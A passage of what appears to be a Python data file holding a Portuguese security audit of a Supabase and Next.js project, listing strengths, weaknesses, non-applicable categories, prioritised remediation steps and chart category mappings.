     "comentário. Os ids herdados do fio da conversa passam por um regex estrito antes de virar "
     "consulta (fio.ts:83 e 106)."),

    ("Uma única função security definer, e com search_path fixo",
     "consome_uso_llm (0010:24-27). O set search_path = public, pg_temp impede sequestro de "
     "uso_llm por schema no caminho do chamador. Nenhuma outra função do schema é definer, e as "
     "sete funções de busca (0003, 0005, 0011, 0017, 0018, 0020) são security invoker, portanto "
     "sujeitas à RLS de quem as chama. O grant amplo demais dessa única função é o achado 2."),

    ("A rota de cron troca uma porta por outra, em vez de remover a porta",
     "src/app/api/vigilia/coletar/route.ts:36-47: está em PUBLICAS porque cron não tem cookie, e "
     "exige Authorization: Bearer $CRON_SECRET, com 503 quando o segredo não está configurado. O "
     "parâmetro ?desde= é validado por um regex ISO na linha 69 antes de virar consulta a APIs "
     "externas."),

    ("A validação da resposta do modelo é feita no servidor e recusa id que não veio da busca",
     "src/lib/consulta/valida.ts é chamado antes de a tela ver qualquer coisa. Além disso, "
     "src/lib/consulta/enriquece.ts:167-176 sobrescreve com dados do banco tudo que não é "
     "argumentação — o modelo não decide rótulo, vigência, cobertura nem URL, e o tipo Fonte "
     "sequer tem campo de URL para ele preencher."),

    ("CI sem segredo, e o que precisa de segredo está separado",
     ".github/workflows/verificacao.yml roda lint, tsc e vitest sem nenhuma variável de ambiente, "
     "o que o torna seguro para PR vindo de fork. Os segredos vivem só em vigilia.yml, que não "
     "roda em pull_request. A interpolação insegura dentro dele é o achado 5."),
]

FRACOS = [
    ("O modelo de acesso declarado não é imposto por ninguém",
     "“Usuário único” é afirmação de três documentos e de uma tela, e de nenhuma linha de "
     "servidor. O cadastro é aberto (achado 1), e a partir dele o estranho é indistinguível do "
     "dono para tudo que não esteja protegido por auth.uid()."),
    ("O gate de custo mora na aplicação, e o dado não o repete",
     "A rota exige sessão, mas a função que dá a vaga aceita anon (achado 2), e a busca que gasta "
     "embedding não pede nada (achado 3). As três camadas de freio descritas no projeto reduzem-se, "
     "na prática, a uma que se contorna e outra que se esgota de fora."),
    ("A autorização das rotas de API tem uma camada só, e ela é anulável pelo caminho",
     "Handlers sem checagem própria, somados a um matcher que decide por extensão do path "
     "(achado 4). As páginas têm duas camadas; as rotas de API não têm nenhuma de reserva."),
    ("Segredos de infraestrutura num passo de shell que interpola entrada",
     "A service role e a credencial do INLABS convivem, no mesmo passo, com uma interpolação não "
     "citada de input de workflow (achado 5)."),
    ("Nenhuma camada de contenção no navegador",
     "Sem CSP e sem frame-ancestors (achado 8), o produto não tem rede sob o único "
     "dangerouslySetInnerHTML que mantém, nem defesa contra emolduramento."),
]

NAO_SE_APLICA = [
    ("Multi-inquilino: organização, workspace, equipe",
     "Não existe conceito de organização, workspace ou equipe no schema. O isolamento pedido pela "
     "categoria 1 é por usuário, e está implementado por RLS. Não há “query de listagem que "
     "esqueceu o tenant” porque não há tenant: a listagem sem filtro explícito é correta por "
     "construção, já que a policy o aplica no banco."),
    ("Papéis, admin, gestão de usuários",
     "Não há isAdmin, canEdit, role nem qualquer gate de papel no frontend — verificado por busca "
     "em src/. Logo não existe o par “UI esconde / servidor não confere” na forma clássica da "
     "categoria 2. Ela foi aplicada na forma que a stack permite: gate do app não espelhado no "
     "banco, o que produziu os achados 1, 2 e 9."),
    ("ORM e SQL montado por concatenação",
     "Não há ORM. O acesso é PostgREST parametrizado e funções SQL declaradas; a única SQL "
     "dinâmica do projeto é execute format(… %I …) sobre nomes de tabela literais, em "
     "0004_rls.sql:33-37, dentro de uma migration e com identificador citado. Não há superfície "
     "de injeção."),
    ("HTML de e-mail e motor de template no servidor",
     "O projeto não envia e-mail: quem envia é o servidor de Auth do Supabase, a partir de "
     "templates do painel. Nenhuma rota renderiza HTML a partir de string. A metade “backend” da "
     "categoria 5 não tem onde acontecer."),
    ("Docker, Helm, Terraform",
     "Não existem no repositório. A superfície de deploy é vercel.json e dois workflows do GitHub "
     "Actions, ambos auditados."),
]

RECOMENDACOES = [
    ("P1", "Fechar o cadastro e espelhar o gate de custo no banco", [
        "Desligar “Allow new users to sign up” no painel do Supabase e registrar essa exigência "
        "ao lado da de “Confirm email desligado”, em CLAUDE.md e README.md — configuração de "
        "painel que não está escrita não sobrevive ao próximo deploy. (achado 1)",
        "Revogar EXECUTE de anon em consome_uso_llm() e conceder só a authenticated. Melhor "
        "ainda: mover o consumo do teto para um caminho que exija a service role, já que a rota "
        "que a chama roda no servidor. (achado 2)",
        "Somar ao teto mensal uma âncora por usuário — uso_llm por auth.uid() — para que uma "
        "conta nova não gaste a cota de outra.",
    ]),
    ("P2", "Fechar as duas superfícies de custo e a de contorno", [
        "Pôr rate limit e cota em /api/busca, ou exigir sessão nela. Se a decisão de mantê-la "
        "pública for para preservar, servir ao menos a perna semântica de um cache por consulta "
        "normalizada. (achado 3)",
        "Chamar usuarioAtual() dentro de cada route handler que não seja intencionalmente "
        "público, para que a autorização não dependa do matcher; e trocar a exclusão por extensão "
        "do matcher por uma que não alcance /api/. (achado 4)",
        "Citar a interpolação no workflow — passar inputs.desde por env: e referenciá-lo como "
        "\"$DESDE\" dentro do script — e validar o formato ISO antes de usar, como a rota HTTP já "
        "faz. (achado 5)",
    ]),
    ("P3", "Endurecer o que hoje depende de configuração externa", [
        "Ligar “Secure password change” no Supabase, ou exigir reautenticação antes de "
        "updateUser({ password }); e desviar quem já tem sessão de /redefinir-senha quando não "
        "houver fluxo de recuperação em curso. (achado 7)",
        "Trocar o using (true) da policy marca_reconferido por uma condição que impeça "
        "sobrescrever carimbo alheio: using (reconferido_por is null or reconferido_por = (select "
        "auth.uid())). (achado 6)",
        "Declarar cabeçalhos de segurança em next.config.mjs: Content-Security-Policy com nonce "
        "para os scripts do Next, frame-ancestors 'none', Referrer-Policy e "
        "X-Content-Type-Options. (achado 8)",
        "Ler o IP da requisição pelo elemento correto de x-forwarded-for para o proxy em uso, ou "
        "usar o identificador de usuário da sessão como chave do limite. (achado 9)",
    ]),
]

# Categoria canônica usada nos gráficos: as cinco pedidas na auditoria, mais dois
# baldes honestos para o que não cabe em nenhuma delas sem forçar.
CAT_CHAVE = {
    1: "2 · Permissão no navegador",
    2: "2 · Permissão no navegador",
    3: "Extra · Custo e abuso",
    4: "3 · IDOR / autorização",
    5: "4 · Chaves expostas",
    6: "1 · Banco sem tranca",
    7: "Extra · Autenticação",
    8: "5 · Inputs sem tratamento",
    9: "2 · Permissão no navegador",
}

ORDEM_CAT = [
    "1 · Banco sem tranca",
    "2 · Permissão no navegador",
    "3 · IDOR / autorização",
    "4 · Chaves expostas",
    "5 · Inputs sem tratamento",
    "Extra · Custo e abuso",
    "Extra · Autenticação",
]
